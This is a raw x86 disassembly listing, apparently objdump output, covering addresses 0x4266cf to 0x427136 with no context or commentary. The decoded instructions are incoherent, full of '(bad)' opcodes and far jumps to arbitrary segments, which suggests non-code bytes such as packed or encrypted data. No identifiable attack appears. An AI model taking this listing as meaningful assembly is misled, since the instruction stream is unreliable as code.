  4266cf:	pop    esp
  4266d0:	inc    ecx
  4266d1:	stos   BYTE PTR es:[edi],al
  4266d2:	xor    eax,0x9dfe06c7
  4266d7:	cdq    
  4266d8:	hlt    
  4266d9:	cmp    DWORD PTR [esi+0x73],esp
  4266dc:	addr16 out dx,eax
  4266de:	les    ebx,FWORD PTR [edi]
  4266e0:	jae    0x4266df
  4266e2:	leave  
  4266e3:	or     bl,BYTE PTR [edx+0x19758af]
  4266e9:	ds pop edx
  4266eb:	mov    ecx,0x912ecb29
  4266f0:	stc    
  4266f1:	mov    ds:0x83e6e787,al
  4266f6:	push   edx
  4266f7:	call   0x90d8:0x9042d6f5
  4266fe:	shl    bh,cl
  426700:	aas    
  426701:	rcr    DWORD PTR [ebx],cl
  426703:	push   ecx
  426704:	ins    BYTE PTR es:[edi],dx
  426705:	ret    0xd44d
  426708:	test   al,0x58
  42670a:	and    ecx,edx
  42670c:	les    esi,FWORD PTR [eax]
  42670e:	pop    ebx
  42670f:	(bad)  
  426710:	mov    cl,0x84
  426712:	icebp  
  426713:	icebp  
  426714:	mov    al,ds:0x27f548e
  426719:	xchg   DWORD PTR [esi],eax
  42671b:	cli    
  42671c:	push   es
  42671d:	repz xor esp,DWORD PTR [edi]
  426720:	repnz pop esi
  426722:	int3   
  426723:	mov    edx,0xd5e4422c
  426728:	cmc    
  426729:	mov    al,0xf9
  42672b:	repnz dec esp
  42672d:	ins    BYTE PTR es:[edi],dx
  42672e:	ja     0x4267ad
  426730:	or     ebx,DWORD PTR [ecx-0x39]
  426733:	xlat   BYTE PTR ds:[ebx]
  426734:	les    eax,FWORD PTR [eax]
	...
  426796:	mov    eax,0xff2ace8d
  42679b:	imul   edi,esp,0xffffff9f
  42679e:	sbb    esp,eax
  4267a0:	leave  
  4267a1:	dec    ebx
  4267a2:	fwait
  4267a3:	or     DWORD PTR [edx],edi
  4267a5:	(bad)  
  4267a6:	push   edi
  4267a7:	call   0x0:0x1070001
  4267ae:	xchg   ebp,eax
  4267af:	pushf  
  4267b0:	pop    ecx
  4267b1:	shr    DWORD PTR [esi+ebx*1],cl
  4267b4:	jno    0x426835
  4267b6:	daa    
  4267b7:	sub    DWORD PTR fs:[ebx-0x7031ecfe],0xea844f60
  4267c2:	iret   
  4267c3:	adc    DWORD PTR [edi],eax
  4267c5:	rol    dl,1
  4267c7:	add    ch,dh
  4267c9:	pop    es
  4267ca:	(bad)  
  4267cb:	retf   
  4267cc:	pusha  
  4267cd:	clc    
  4267ce:	outs   dx,DWORD PTR ds:[esi]
  4267cf:	push   es
  4267d0:	inc    edx
  4267d1:	mov    edi,0xbdb6d811
  4267d6:	pop    ss
  4267d7:	dec    ecx
  4267d8:	cdq    
  4267d9:	fwait
  4267da:	test   DWORD PTR [ebx-0x1e8b9e31],0xd29c91be
  4267e4:	out    0xb4,al
  4267e6:	(bad)  
  4267e7:	into   
  4267e8:	fst    QWORD PTR [edx-0x34bb52a7]
  4267ee:	ja     0x42677d
  4267f0:	xchg   ebp,eax
  4267f1:	or     edx,DWORD PTR [edi]
  4267f3:	xchg   esp,eax
  4267f4:	or     BYTE PTR [edi-0x42],dl
  4267f7:	inc    eax
  4267f8:	pop    ecx
  4267f9:	je     0x4267b6
  4267fb:	cmp    eax,0x9abe2726
  426800:	xor    ebx,DWORD PTR [ecx-0x55]
  426803:	sub    DWORD PTR [ebp-0x36ecfc28],0x40cca5f2
  42680d:	mov    ebp,0xaa51e792
  426812:	inc    ecx
  426813:	sbb    ah,ch
  426815:	dec    esi
  426816:	mov    ch,0x5f
  426818:	sbb    eax,0xb1abe707
  42681d:	push   es
  42681e:	jnp    0x42686d
  426820:	mov    al,0x8f
  426822:	and    BYTE PTR [edi+0x43],bl
  426825:	and    al,0x3b
  426827:	imul   ecx,edx,0x38
  42682a:	pop    esi
  42682b:	sub    al,0x70
  42682d:	or     BYTE PTR [edx*2-0x747a98d9],bh
  426834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426835:	xchg   ebx,eax
  426836:	xchg   BYTE PTR [ecx],ah
  426838:	jmp    0xc7fd:0x6851990c
  42683f:	and    ecx,DWORD PTR [ecx+0x25]
  426842:	je     0x4267d1
  426844:	arpl   WORD PTR [eax+0x68642b0b],si
  42684a:	jge    0x4267d7
  42684c:	cmp    esp,ecx
  42684e:	imul   ecx,DWORD PTR [ebx+0x62],0x37881e6
  426855:	and    DWORD PTR [eax],ebx
  426857:	xor    esp,DWORD PTR [ebp+0x6e]
  42685a:	aad    0x59
  42685c:	or     al,0x3f
  42685e:	push   ecx
  42685f:	add    ebx,esi
  426861:	in     eax,0x95
  426863:	push   eax
  426864:	sbb    eax,0xbfbe1e5e
  426869:	ret    
  42686a:	or     al,0xdd
  42686c:	jbe    0x426878
  42686e:	je     0x42685d
  426870:	scas   eax,DWORD PTR es:[edi]
  426871:	sub    eax,0x223442c6
  426876:	dec    ebx
  426877:	rol    esp,0x3b
  42687a:	xchg   ebp,eax
  42687b:	or     eax,esi
  42687d:	adc    al,0xd0
  42687f:	mov    edx,ebp
  426881:	add    ch,dh
  426883:	sbb    al,0xc1
  426885:	aaa    
  426886:	and    edx,DWORD PTR ds:0xc5cf0101
  42688c:	div    al
  42688e:	test   DWORD PTR [edx-0x49],edi
  426891:	enter  0x330c,0x43
  426895:	sti    
  426896:	retf   
  426897:	jmp    0x9344:0x6a99f702
  42689e:	dec    ebx
  42689f:	(bad)  
  4268a1:	or     BYTE PTR ss:[esi],cl
  4268a4:	or     bl,ah
  4268a6:	data16 mov al,ds:0x61f97c3a
  4268ac:	push   ds
  4268ad:	xchg   esp,eax
  4268ae:	imul   ecx,DWORD PTR [ebp+0x5b37e2b9],0xae
	...
  426914:	add    BYTE PTR [eax],al
  426916:	mov    WORD PTR [esi+0x7d],cs
  426919:	jge    0x42691a
  42691b:	jg     0x4268a9
  42691d:	jmp    FWORD PTR [esi]
  42691f:	out    0xa0,eax
  426921:	stos   DWORD PTR es:[edi],eax
  426922:	push   cs
  426923:	imul   ebx,DWORD PTR [ecx+0x19b5e79],0x0
  42692a:	pop    es
  42692b:	add    DWORD PTR [eax],eax
  42692d:	add    BYTE PTR [edx],bh
  42692f:	dec    esi
  426930:	pop    ebp
  426931:	(bad)  
  426932:	or     al,0xdb
  426934:	cmp    DWORD PTR [esi-0x9],0x575521fd
  42693b:	ds loope 0x4268e5
  42693e:	in     al,0x44
  426940:	xchg   cl,cl
  426942:	pop    ds
  426943:	scas   al,BYTE PTR es:[edi]
  426944:	(bad)  
  426945:	xor    ebp,edi
  426947:	mov    al,cs:0x4cfb5ca8
  42694d:	jp     0x426959
  42694f:	xor    edx,0x69
  426952:	inc    edx
  426953:	jmp    0xbe416c8d
  426958:	inc    esi
  426959:	jp     0x426960
  42695b:	stos   DWORD PTR es:[edi],eax
  42695c:	push   ebp
  42695d:	rcl    BYTE PTR [ecx-0x376a5268],0xe5
  426964:	dec    ebx
  426965:	jns    0x42695b
  426967:	jae    0x4269b8
  426969:	dec    eax
  42696a:	mov    ds:0x6dd9cf7d,al
  42696f:	stos   DWORD PTR es:[edi],eax
  426970:	(bad)  
  426971:	jp     0x426943
  426973:	jp     0x426953
  426975:	sbb    DWORD PTR [eax+0x55],ebx
  426978:	stos   BYTE PTR es:[edi],al
  426979:	bound  ebp,QWORD PTR [ebp+0x77]
  42697c:	neg    BYTE PTR [edx]
  42697e:	(bad)  
  42697f:	(bad)  
  426980:	push   eax
  426981:	int3   
  426982:	fbld   TBYTE PTR [eax-0x2255b3c]
  426988:	fwait
  426989:	add    eax,0xd47a9e01
  42698e:	add    eax,0x30e20f02
  426993:	push   esi
  426994:	or     bh,BYTE PTR [edx+0x44]
  426997:	sbb    esi,0x15
  42699a:	and    dh,bl
  42699c:	addr16 test al,0x7c
  42699f:	cli    
  4269a0:	ja     0x4269d8
  4269a2:	loope  0x42692c
  4269a4:	rol    DWORD PTR [ebp+0x70],1
  4269a7:	push   edi
  4269a8:	sub    DWORD PTR [edx],eax
  4269aa:	xor    BYTE PTR [edx-0x2e],dh
  4269ad:	mov    al,ds:0xd6807c0c
  4269b2:	jno    0x4269aa
  4269b4:	mov    ch,0x50
  4269b6:	ret    
  4269b7:	jle    0x426970
  4269b9:	jmp    0x4ae0f22
  4269be:	(bad)  
  4269bf:	ja     0x426a2f
  4269c1:	cmp    eax,DWORD PTR [eax]
  4269c3:	xchg   esi,eax
  4269c4:	xchg   esi,eax
  4269c5:	sbb    BYTE PTR [ecx+0x666634b2],cl
  4269cb:	ds inc ecx
  4269cd:	lock sub ecx,esp
  4269d0:	mov    ds:0xa5d7a32f,al
  4269d5:	ror    BYTE PTR ds:0x80914e78,1
  4269db:	jne    0x4269f6
  4269dd:	test   al,0x49
  4269df:	xor    al,0x5a
  4269e1:	scas   al,BYTE PTR es:[edi]
  4269e2:	mov    ebp,0x275d90a3
  4269e7:	call   0x180b:0x2d453071
  4269ee:	dec    BYTE PTR [esi-0x23]
  4269f1:	mov    ebp,0xc95a08b4
  4269f6:	addr16 push ds
  4269f8:	mov    ecx,0x79ecf43
  4269fd:	pop    eax
  4269fe:	cwde   
  4269ff:	aad    0x65
  426a01:	or     bh,BYTE PTR [eax]
  426a03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a04:	adc    esi,eax
  426a06:	mov    ecx,ds
  426a08:	and    eax,0x55b8e678
  426a0d:	jle    0x4269b8
  426a0f:	pop    ecx
  426a10:	cmp    ch,al
  426a12:	jle    0x426a0d
  426a14:	adc    esi,DWORD PTR [eax]
  426a16:	pop    esp
  426a17:	stc    
  426a18:	and    al,0xe1
  426a1a:	pop    ecx
  426a1b:	test   cl,ch
  426a1d:	and    eax,DWORD PTR [esi]
  426a1f:	data16 adc bl,BYTE PTR [edi+0x41]
  426a23:	xchg   edi,eax
  426a24:	mul    BYTE PTR [ebx+0x3cab1a5a]
  426a2a:	fstp   QWORD PTR [esi+0x551d140c]
  426a30:	xchg   esi,eax
  426a31:	(bad)  
  426a32:	ficomp DWORD PTR [edi+0x41]
	...
  426a94:	add    BYTE PTR [eax],al
  426a96:	cdq    
  426a97:	sub    BYTE PTR ds:0xdb77bd56,cl
  426a9d:	out    dx,eax
  426a9e:	xor    dl,BYTE PTR [edi+eiz*4]
  426aa1:	cld    
  426aa2:	ins    DWORD PTR es:[edi],dx
  426aa3:	mov    bl,0xc8
  426aa5:	test   BYTE PTR [ebp-0x64],ah
  426aa8:	add    DWORD PTR [eax],eax
  426aaa:	pop    es
  426aab:	add    DWORD PTR [eax],eax
  426aad:	add    bl,bl
  426aaf:	sar    ch,0x26
  426ab2:	push   ebp
  426ab3:	loop   0x426ac5
  426ab5:	bound  eax,QWORD PTR ds:0x3f86b7
  426abb:	xor    ch,BYTE PTR [ebp-0x28]
  426abe:	and    dh,ch
  426ac0:	or     cl,0xe2
  426ac3:	mov    bh,0x9d
  426ac5:	mov    bl,0x4f
  426ac7:	inc    esp
  426ac8:	loope  0x426a9d
  426aca:	jno    0x426b2b
  426acc:	cwde   
  426acd:	sbb    DWORD PTR ss:[ebx-0x11f71da0],edi
  426ad4:	jo     0x426a9d
  426ad6:	fnstenv [ecx-0x60b9b0dd]
  426adc:	jecxz  0x426b2d
  426ade:	mov    bl,0xf5
  426ae0:	inc    esi
  426ae1:	aad    0xb8
  426ae3:	pop    edi
  426ae4:	xor    al,0x75
  426ae6:	rcr    DWORD PTR [esi+0x31e5a371],cl
  426aec:	jne    0x426acd
  426aee:	and    DWORD PTR [ebx-0xd],ebx
  426af1:	xor    DWORD PTR [edi],edx
  426af3:	push   cs
  426af4:	pushf  
  426af5:	mov    es,WORD PTR [eax-0x76e45923]
  426afb:	and    dh,BYTE PTR [edi]
  426afd:	mov    esp,0x310fa47
  426b02:	imul   edx,DWORD PTR [ebp+0x35d0e590],0x6ae3a53a
  426b0c:	test   al,0x91
  426b0e:	jp     0x426b49
  426b10:	xor    eax,0x499ef3d8
  426b15:	jns    0x426abf
  426b17:	lock daa 
  426b19:	and    al,0xc1
  426b1b:	ret    0x8f3
  426b1e:	loope  0x426aa2
  426b20:	xor    ah,BYTE PTR [ebx]
  426b22:	ins    DWORD PTR es:[edi],dx
  426b23:	jno    0x426b30
  426b25:	pusha  
  426b26:	mov    ds:0x7205d076,al
  426b2b:	idiv   BYTE PTR [edi-0x5b66809a]
  426b31:	test   BYTE PTR [ecx-0x6],al
  426b34:	mov    edx,0xba160583
  426b39:	sbb    BYTE PTR [eax-0x29],0x36
  426b3d:	es inc ebp
  426b3f:	push   ebp
  426b40:	gs leave 
  426b42:	push   esp
  426b43:	fiadd  WORD PTR [edi]
  426b45:	and    al,0x94
  426b47:	cmc    
  426b48:	mov    edi,0xb599477b
  426b4d:	mov    esi,0xf9e2ff14
  426b52:	pop    ebp
  426b53:	dec    ebp
  426b54:	cwde   
  426b55:	and    eax,DWORD PTR [esi-0xd]
  426b58:	xor    ah,BYTE PTR [esi]
  426b5a:	sbb    dl,0x18
  426b5d:	shr    BYTE PTR [edx+0x35],cl
  426b60:	mov    al,0x5f
  426b62:	das    
  426b63:	aam    0x4a
  426b65:	loop   0x426bcc
  426b67:	dec    edx
  426b68:	add    al,cl
  426b6a:	sbb    DWORD PTR [ebp+0x75],edi
  426b6d:	std    
  426b6e:	repz cwde 
  426b70:	xor    dh,bh
  426b72:	xchg   al,dh
  426b74:	fcomp  DWORD PTR [ebp+edi*4+0x4db1a46e]
  426b7b:	jecxz  0x426b24
  426b7d:	fsubr  st(0),st
  426b7f:	cld    
  426b80:	lods   eax,DWORD PTR ds:[esi]
  426b81:	mov    ds:0xfc8991e9,eax
  426b86:	(bad)  
  426b89:	xor    edx,edx
  426b8b:	test   eax,0xfab9604f
  426b90:	loop   0x426b18
  426b92:	(bad)  
  426b95:	inc    ebx
  426b96:	dec    ebx
  426b97:	retf   0x626a
  426b9a:	xor    DWORD PTR [ebx-0x6],ebx
  426b9d:	xchg   edi,eax
  426b9e:	dec    eax
  426b9f:	es scas eax,DWORD PTR es:[edi]
  426ba1:	jo     0x426b8a
  426ba3:	sahf   
  426ba4:	inc    ebp
  426ba5:	into   
  426ba6:	lds    eax,FWORD PTR [edi-0x6a]
  426ba9:	adc    BYTE PTR [ecx+ebx*8],bl
  426bac:	inc    edx
  426bad:	cs hlt 
  426baf:	adc    ah,dh
  426bb1:	jnp    0x426b45
  426bb3:	lds    edi,FWORD PTR [eax+0x0]
	...
  426c16:	loop   0x426c78
  426c18:	test   DWORD PTR [esi+0x74f3f787],esi
  426c1e:	je     0x426c67
  426c20:	push   0xffffffb6
  426c22:	rol    DWORD PTR [eax+eax*2],1
  426c25:	adc    al,0x6c
  426c27:	popf   
  426c28:	add    DWORD PTR [eax],eax
  426c2a:	pop    es
  426c2b:	add    DWORD PTR [eax],eax
  426c2d:	add    BYTE PTR [edi-0x24],cl
  426c30:	int3   
  426c31:	pusha  
  426c32:	xchg   edi,eax
  426c33:	(bad)  
  426c34:	jmp    0x426bdb
  426c36:	jne    0x426c5b
  426c38:	pop    es
  426c39:	imul   ebx,DWORD PTR ds:[ebx-0x694b23e2],0x61
  426c41:	rol    ecx,1
  426c43:	cmp    eax,0xd036eca9
  426c48:	jno    0x426c99
  426c4a:	adc    DWORD PTR [ecx-0x5b],edx
  426c4d:	cmp    esi,0x33
  426c50:	pop    ds
  426c51:	adc    bl,BYTE PTR [esi+0x78750fc2]
  426c57:	aas    
  426c58:	jns    0x426bf9
  426c5a:	fisub  DWORD PTR [ecx-0x34]
  426c5d:	mov    ds:0xb1a4514c,eax
  426c62:	rcl    BYTE PTR [edx+edx*8+0x7a],cl
  426c66:	out    dx,eax
  426c67:	add    bl,BYTE PTR [edi+0xafc1dc5]
  426c6d:	xchg   ecx,eax
  426c6e:	test   DWORD PTR [edx-0x6e],ebx
  426c71:	fs xor ah,ch
  426c74:	inc    esi
  426c75:	retf   0xdd9c
  426c78:	sub    BYTE PTR [ebx],ch
  426c7a:	in     al,0x15
  426c7c:	inc    esp
  426c7d:	push   esp
  426c7e:	cmp    ch,BYTE PTR [ecx]
  426c80:	jae    0x426c99
  426c82:	xchg   ecx,eax
  426c83:	push   eax
  426c84:	jo     0x426cfa
  426c86:	inc    esp
  426c87:	push   es
  426c88:	adc    dl,BYTE PTR [eax-0xff99a44]
  426c8e:	xlat   BYTE PTR ds:[ebx]
  426c8f:	pushf  
  426c90:	sbb    DWORD PTR [ebx+0x30],edx
  426c93:	pop    esp
  426c94:	outs   dx,BYTE PTR ds:[esi]
  426c95:	inc    eax
  426c96:	sub    eax,0x9d5e3731
  426c9b:	sub    edi,DWORD PTR ds:0xa86c0041
  426ca1:	and    eax,0x6455f6a8
  426ca6:	xor    ebp,esi
  426ca8:	adc    BYTE PTR [ebx],ch
  426caa:	sub    DWORD PTR [edi+0x55084583],0x6319e6ac
  426cb4:	jne    0x426c6e
  426cb6:	clc    
  426cb7:	xor    BYTE PTR [ebp+edx*2+0x44ee282b],cl
  426cbe:	mov    ebx,0x43c69516
  426cc3:	or     ebx,DWORD PTR [eax+0x3b]
  426cc6:	jle    0x426c96
  426cc8:	jg     0x426d21
  426cca:	mov    ah,0x6f
  426ccc:	test   BYTE PTR [ecx+ebx*1],ch
  426ccf:	pop    edi
  426cd0:	xchg   ebp,eax
  426cd1:	enter  0xd20d,0xb8
  426cd5:	sahf   
  426cd6:	lock and BYTE PTR [ebx+0x56],0xc2
  426cdb:	mov    eax,ds:0xe7605df1
  426ce0:	(bad)  
  426ce1:	into   
  426ce2:	sub    al,0x0
  426ce4:	sahf   
  426ce5:	sbb    BYTE PTR [ebx],dl
  426ce7:	cmp    esp,DWORD PTR [eax+0x6f012544]
  426ced:	jge    0x426cc4
  426cef:	push   ds
  426cf0:	adc    esp,edi
  426cf2:	mov    BYTE PTR [ebx],cl
  426cf4:	je     0x426d51
  426cf6:	clc    
  426cf7:	inc    eax
  426cf8:	sub    al,BYTE PTR [edx-0x217dd83b]
  426cfe:	pop    eax
  426cff:	xchg   edx,eax
  426d00:	push   edx
  426d01:	std    
  426d02:	test   bh,ch
  426d04:	test   BYTE PTR [ebx+0x6430553],cl
  426d0a:	jno    0x426d71
  426d0c:	mov    bl,0x3e
  426d0e:	sbb    WORD PTR [ecx],di
  426d11:	rol    BYTE PTR [eax+0x40],1
  426d14:	cld    
  426d15:	out    dx,al
  426d16:	fld    DWORD PTR [ebx-0x3d]
  426d19:	pop    ds
  426d1a:	pop    esi
  426d1b:	cmp    dl,dl
  426d1d:	jo     0x426ca6
  426d1f:	push   ebx
  426d20:	mov    eax,DWORD PTR [edx-0x16b59d88]
  426d26:	and    BYTE PTR [ebp-0x1f],cl
  426d29:	xor    eax,0xc1a85784
  426d2e:	pop    esi
  426d2f:	push   cs
  426d30:	and    al,0x5
  426d32:	add    eax,0xf561
	...
  426d93:	add    BYTE PTR [eax],al
  426d95:	add    BYTE PTR [edx],cl
  426d97:	mov    cl,0x61
  426d99:	repz sti 
  426d9b:	repz call 0xaa87:0x7e1b1bf9
  426da3:	dec    ecx
  426da4:	mov    ds:0x19e73e2,al
  426da9:	add    BYTE PTR [edi],al
  426dab:	add    DWORD PTR [eax],eax
  426dad:	add    bl,ch
  426daf:	std    
  426db0:	mov    eax,ds:0x41f5febd
  426db5:	fstp   TBYTE PTR [ecx-0x4890487f]
  426dbb:	test   al,0xbc
  426dbd:	ss loopne 0x426de3
  426dc0:	mov    edx,0x462442c0
  426dc5:	daa    
  426dc6:	mov    dl,0xdd
  426dc8:	add    BYTE PTR ds:0x18b9e89c,ah
  426dce:	add    al,0xa5
  426dd0:	push   ds
  426dd1:	cdq    
  426dd2:	inc    edi
  426dd3:	loope  0x426dda
  426dd5:	pop    esi
  426dd6:	sbb    eax,0xda0aca92
  426ddb:	fnstcw WORD PTR [eax+eiz*1-0x60260081]
  426de2:	scas   eax,DWORD PTR es:[edi]
  426de3:	push   0x5d7b6d5c
  426de8:	test   DWORD PTR [esi+0x4a],0x4af31855
  426def:	shr    DWORD PTR [ebx-0x40ee1a62],cl
  426df5:	xchg   edx,eax
  426df6:	mov    WORD PTR [ecx-0x6b],gs
  426df9:	or     DWORD PTR [ebp-0x7c291eb2],ebp
  426dff:	xor    DWORD PTR [ebp+0x42],esi
  426e02:	xchg   ebx,eax
  426e03:	aam    0xf9
  426e05:	icebp  
  426e06:	in     eax,dx
  426e07:	sub    edx,edi
  426e09:	sub    DWORD PTR [ebx-0x1],0xf42ef53a
  426e10:	cmp    DWORD PTR [ebx-0x2d7bc2f5],esp
  426e16:	dec    edi
  426e17:	(bad)  [esi+0x48]
  426e1a:	aam    0x8e
  426e1c:	adc    eax,0x23d8b788
  426e21:	inc    eax
  426e22:	adc    DWORD PTR [ebp+0x6c],0xffffff88
  426e26:	ret    0x5fc5
  426e29:	loope  0x426e21
  426e2b:	pop    es
  426e2c:	cmp    eax,0xe3259bd0
  426e31:	adc    ebx,edx
  426e33:	jl     0x426e5d
  426e35:	mul    BYTE PTR [edi]
  426e37:	adc    dl,BYTE PTR [esi]
  426e39:	mov    eax,0x5e24da3d
  426e3e:	xor    al,0xc
  426e40:	sbb    ecx,edi
  426e42:	loope  0x426e31
  426e44:	jl     0x426de3
  426e46:	pop    ds
  426e47:	hlt    
  426e48:	jae    0x426dcf
  426e4a:	push   edi
  426e4b:	push   ss
  426e4c:	rcr    DWORD PTR [esi-0x63ddf657],cl
  426e52:	adc    BYTE PTR [ecx],al
  426e54:	(bad)  
  426e55:	or     eax,0xc7c7638f
  426e5a:	sub    al,BYTE PTR [edx-0x59]
  426e5d:	in     eax,dx
  426e5e:	push   ebp
  426e5f:	test   al,0x64
  426e61:	sub    ch,BYTE PTR [edx]
  426e63:	pop    es
  426e64:	fimul  WORD PTR ds:0x8e3a0e5f
  426e6a:	push   0xffffffe8
  426e6c:	iret   
  426e6d:	add    bh,BYTE PTR [ebx+0x58486261]
  426e73:	sub    esp,DWORD PTR [ecx+edi*1+0x948c5bd]
  426e7a:	jmp    0xa23b8cb0
  426e7f:	pop    eax
  426e80:	xchg   ebp,eax
  426e81:	(bad)  
  426e82:	das    
  426e83:	popf   
  426e84:	lahf   
  426e85:	push   edx
  426e86:	pop    es
  426e87:	pop    ds
  426e88:	xor    al,0x67
  426e8a:	bound  ebp,QWORD PTR [edi+0x6f3d5b60]
  426e90:	mov    edi,0x80564225
  426e95:	(bad)  
  426e96:	jno    0x426e18
  426e98:	add    ecx,eax
  426e9a:	lahf   
  426e9b:	inc    ebx
  426e9c:	dec    edx
  426e9d:	imul   BYTE PTR [edx-0x4ed60d9e]
  426ea3:	jg     0x426eeb
  426ea5:	fimul  DWORD PTR [edx]
  426ea7:	or     DWORD PTR [edi+0x36649ae7],0x42913d09
  426eb1:	int3   
  426eb2:	jns    0x426ee0
  426eb4:	and    al,0x0
	...
  426f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f17:	mov    ds:0xf5c7f1c7,al
  426f1c:	mov    dh,0xf7
  426f1e:	pop    eax
  426f1f:	or     BYTE PTR [ecx+0x5b6462a4],ch
  426f25:	loop   0x426fa1
  426f27:	lahf   
  426f28:	add    DWORD PTR [eax],eax
  426f2a:	pop    es
  426f2b:	add    DWORD PTR [eax],eax
  426f2d:	add    BYTE PTR [ebp-0x49371dc8],ah
  426f33:	popa   
  426f34:	xor    DWORD PTR [edi-0x33],0xffffffd3
  426f38:	push   esp
  426f39:	jno    0x426f46
  426f3b:	das    
  426f3c:	in     eax,dx
  426f3d:	add    eax,0xb880ae0f
  426f42:	xchg   edx,eax
  426f43:	pop    ebx
  426f44:	not    bh
  426f46:	mov    cl,0xd1
  426f48:	fs jmp 0x426f18
  426f4b:	pop    esp
  426f4c:	lods   al,BYTE PTR ds:[esi]
  426f4d:	sbb    esi,DWORD PTR [ecx-0x57]
  426f50:	stc    
  426f51:	(bad)  
  426f52:	arpl   WORD PTR [eax-0x67],bp
  426f55:	mov    esp,0xaae576d
  426f5a:	(bad)  
  426f5b:	call   0x778f8853
  426f60:	jle    0x426efd
  426f62:	mov    DWORD PTR [ecx+0x7],ecx
  426f65:	cmp    BYTE PTR [esi],dh
  426f67:	cwde   
  426f68:	mov    ecx,0x193afa05
  426f6d:	sbb    esi,DWORD PTR [ebx-0x33]
  426f70:	sbb    ebx,esp
  426f72:	jl     0x426fc2
  426f74:	xor    DWORD PTR [ebx+0x3e522794],eax
  426f7a:	std    
  426f7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f7c:	pop    es
  426f7d:	push   edi
  426f7e:	xchg   BYTE PTR [edx+0x70038b3e],bl
  426f84:	mov    cl,0xa
  426f86:	les    ecx,FWORD PTR [eax-0x51c84a]
  426f8c:	mov    ebp,0x598e9025
  426f91:	push   esi
  426f92:	mov    ds:0x17790bbd,al
  426f97:	push   eax
  426f98:	xor    bh,BYTE PTR [ecx+0x167ed125]
  426f9e:	idiv   BYTE PTR [esi]
  426fa0:	lea    ebx,[ebp-0x47482d0c]
  426fa6:	shl    ebx,1
  426fa8:	inc    edx
  426fa9:	push   esi
  426faa:	jmp    0x426fbc
  426fac:	cmp    cl,bh
  426fae:	mov    esp,DWORD PTR [edx-0x4e14587f]
  426fb4:	xchg   edx,eax
  426fb5:	xor    al,0x30
  426fb7:	sub    eax,edi
  426fb9:	dec    esi
  426fba:	aad    0xc9
  426fbc:	nop
  426fbd:	ja     0x426f43
  426fbf:	cmp    ebx,ebx
  426fc1:	sub    BYTE PTR [edx+0x48799ff8],bh
  426fc7:	stos   BYTE PTR es:[edi],al
  426fc8:	and    al,0xdf
  426fca:	xor    eax,0xb72a6ef6
  426fcf:	inc    ebx
  426fd0:	cmc    
  426fd1:	gs sbb eax,ecx
  426fd4:	daa    
  426fd5:	(bad)  
  426fd6:	mov    al,0x62
  426fd8:	sbb    eax,0x49a8f291
  426fdd:	mov    dh,0xe7
  426fdf:	mov    edi,0xc2cd603
  426fe4:	xchg   ebx,eax
  426fe5:	mov    ch,0x28
  426fe7:	bnd jmp 0xbaa2017f
  426fed:	cdq    
  426fee:	cmp    BYTE PTR ds:0x862c2ff9,bh
  426ff4:	lods   eax,DWORD PTR ds:[esi]
  426ff5:	lea    ebp,[ecx]
  426ff7:	add    al,0xaf
  426ff9:	inc    eax
  426ffa:	loope  0x427000
  426ffc:	ret    
  426ffd:	dec    edx
  426ffe:	out    dx,al
  426fff:	in     eax,0xf5
  427001:	jae    0x427001
  427003:	push   edx
  427004:	nop
  427005:	mov    al,ds:0x493812a8
  42700a:	popa   
  42700b:	mov    DWORD PTR [esi-0x2d15c0e9],edi
  427011:	ret    0xd273
  427014:	jmp    0xafe0cb56
  427019:	sub    edx,0xffffffbd
  42701c:	mov    ebp,0x936ca790
  427021:	sbb    bl,bl
  427023:	xchg   ebx,eax
  427024:	push   ds
  427025:	lods   al,BYTE PTR ds:[esi]
  427026:	jecxz  0x426ff9
  427028:	(bad)  
  42702a:	push   ss
  42702b:	repz sub DWORD PTR [edx],ebx
  42702e:	mov    ecx,0x1b18ba97
  427033:	pop    es
  427034:	cli    
	...
  427095:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42709c:	(bad)  
  42709d:	std    
  42709e:	stos   DWORD PTR es:[edi],eax
  42709f:	sbb    DWORD PTR [eax+0x7a4cd3c6],eax
  4270a5:	add    al,BYTE PTR [ecx+0x70001a0]
  4270ab:	add    DWORD PTR [eax],eax
  4270ad:	add    ch,dh
  4270af:	mov    bl,0x88
  4270b1:	out    0x3e,eax
  4270b3:	push   0xffffff8b
  4270b5:	fist   DWORD PTR [ebx-0x2cd49c34]
  4270bb:	mov    ah,0x73
  4270bd:	sub    al,0x6f
  4270bf:	dec    eax
  4270c0:	iret   
  4270c1:	xchg   BYTE PTR [ebx],dh
  4270c3:	jmp    0x427107
  4270c5:	jno    0x427061
  4270c7:	les    edx,FWORD PTR [ecx-0x1c]
  4270ca:	test   BYTE PTR [esi+0x60c8a58],0x3f
  4270d1:	fdiv   DWORD PTR [ebx]
  4270d3:	or     al,BYTE PTR [eax-0x27eadb09]
  4270d9:	lods   al,BYTE PTR ds:[esi]
  4270da:	xchg   esp,eax
  4270db:	mov    ebx,0x181b2ad1
  4270e0:	stos   BYTE PTR es:[edi],al
  4270e1:	xchg   esp,eax
  4270e2:	fbld   TBYTE PTR es:[esp+edi*1+0x4a]
  4270e7:	jnp    0x4270ab
  4270e9:	xchg   esp,eax
  4270ea:	jae    0x4270cc
  4270ec:	dec    ebx
  4270ed:	or     BYTE PTR [eax+0xc549a20],0x8f
  4270f4:	ins    DWORD PTR es:[edi],dx
  4270f5:	sti    
  4270f6:	cdq    
  4270f7:	push   DWORD PTR [ebp+0x60]
  4270fa:	sbb    al,dl
  4270fc:	dec    ebx
  4270fd:	add    BYTE PTR [ebx],al
  4270ff:	dec    ebx
  427100:	xor    al,0x7b
  427102:	jae    0x427131
  427104:	gs push eax
  427106:	xchg   BYTE PTR [edi+0x4f4e87d5],al
  42710c:	jae    0x4270b0
  42710e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42710f:	mov    esp,0xd977b0df
  427114:	jge    0x42718e
  427116:	sbb    ch,ah
  427118:	rol    DWORD PTR ds:0x1916697d,0xc3
  42711f:	sub    DWORD PTR [ecx],0xd
  427122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427123:	mov    ah,0x27
  427125:	retf   
  427126:	adc    bh,BYTE PTR [ebx]
  427128:	xlat   BYTE PTR ds:[ebx]
  427129:	(bad)  
  42712a:	bound  ebx,QWORD PTR ds:0x1e8d5009
  427130:	push   eax
  427131:	pop    ebx
  427132:	sahf   
  427133:	xchg   ecx,eax
  427134:	mov    bh,0x10
  427136:	imul   ebx,ebp,0x7b
